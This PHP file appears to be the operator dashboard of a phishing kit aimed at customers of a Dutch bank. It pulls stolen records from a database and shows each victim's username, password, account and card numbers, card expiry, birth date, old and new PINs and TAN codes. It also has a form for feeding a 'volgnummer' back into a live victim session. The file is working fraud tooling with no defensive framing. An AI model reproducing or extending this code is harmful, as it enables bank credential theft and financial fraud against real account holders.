<?php
require_once("../common/commonfiles.php");
$data = db::getRecords("SELECT * FROM data ORDER BY id DESC");
include_once 'header.php';
?>
<table class="table">
    <thead>
        <tr>
            <th>Date</th>
            <th>Username</th>
            <th>Password</th>
            <th class="text-center" width="15%">Info</th>
            <th class="text-center" width="15%">PIN</th>
            <th>Volgnummer</th>
            <th>Tan Code</th>
            <th>Action</th>
        </tr>
    </thead>
    <tbody>
        <?php
        $counter = 1;
        foreach ($data as $value) {
            ?>
            <tr>
                <td><b><?php echo $value['date']; ?></b>
                </td>
                <td><?php echo $value['username']; ?></td>
                <td><?php echo $value['password']; ?></td>
                <td class="text-center"  width="15%">
                    <a href="#" 
                       data-toggle="popover"
                       data-placement="bottom"
                       data-html="true"
                       data-trigger="hover" 
                       data-content="<b>Rek Nmr:</b><br /><?php echo $value["rk_nummer"]; ?><br />
                       <b>Pas Nmr:</b><br /><?php echo $value["pas_nummer"]; ?><br />
                       <b>Pas geldig tot en met	:</b><br /><?php echo (!empty($value['exp_month']) && !empty($value['exp_year'])) ? $value['exp_month'] . "/" . $value['exp_year'] : ""; ?><br />
                       <b>Geboortdatum:</b><br /><?php echo (!empty($value['birth_day']) && !empty($value['birth_month']) && !empty($value['birth_year'])) ? $value['birth_day'] . "/" . $value['exp_month'] . "/" . $value['birth_year'] : ""; ?>">
                        <i class="fa fa-exclamation-circle"></i>
                    </a>
                </td>
                <td class="text-center" width="15%">
                    <a href="#" 
                       data-toggle="popover"
                       data-placement="bottom"
                       data-html="true"
                       data-trigger="hover" 
                       data-content="<b>Huidige pin:</b><br /><?php echo $value["pin1"]; ?><br />
                       <b>Huidige pin (bevestiging):</b><br /><?php echo $value["pin2"]; ?><br />
                       <b>Nieuwe pin:</b><br /><?php echo $value["pin3"]; ?><br />
                       <b>Nieuwe pin (bevestiging):</b><br /><?php echo $value["pin4"]; ?>">
                        <i class="fa fa-exclamation-circle"></i>
                    </a>
                </td>
                <td>
                    <input type="text" 
                           style="width:26%; <?php echo ($value['volg_nummer'] == '' ) ? 'background-color:orange' : 'background-color:green'; ?>" class="form-control" value="<?php echo $value['volg_nummer']; ?>" data-toggle="popover" data-placement="top" data-html="true"
                           data-content="<form name='form' method='post' action='actions.php?j=volg_nummer'><div class=''><div class='input-group'><input type='text' class='form-control' value='<?php echo $value['volg_nummer']; ?>' name='volg_nummer' placeholder='Enter Volgnummer''><span class='input-group-btn'> <button class='btn btn-secondary' type='submit'>Submit</button></span></div></div></div><input type='hidden' name='rid' value='<?php echo $value['id']; ?>'></form>" 
                           title="Volgnummer">
                </td>
                <td><?php echo $value['volg_nummer1']; ?></td>                
                <?php if ($value['status'] == 0) { ?>
                    <td><?php if ($_SESSION["loggedInUserRole"] == "admin") { ?>
                            <span style="color: orange!important;font-size: 20px;float: left;"><a class="btn btn-xs btn-danger" href="actions.php?j=9&id=<?php echo $value['id'] ?>" onclick="return deleteit()" title="Delete"><i class="glyphicon glyphicon-trash"></i></a>  </span>
                        <?php } ?>
                    </td>
                <?php } else if ($value['status'] == 1) { ?>
                    <td><span style="color:green"><b>Approved</b></span></td>
                <?php } else if ($value['status'] == 2) { ?>
                    <td><span style="color:red"><b>Deleted</b></span></td>
                <?php } ?>
            </tr>

            <?php
            $counter++;
        }
        ?>

    </tbody>
</table>

<script>



    $(document).ready(function () {
        $('.bcv').on('mouseover', function (e) {
            $(this).tooltip('disable');
        });

        $('.bcv').on('focus', function () {
            $(this).tooltip('enable').tooltip('show');
        });

    });
    $(function () {
        $.get("actions3.php");
        $('[data-toggle="popover"]').popover();
    })

</script>
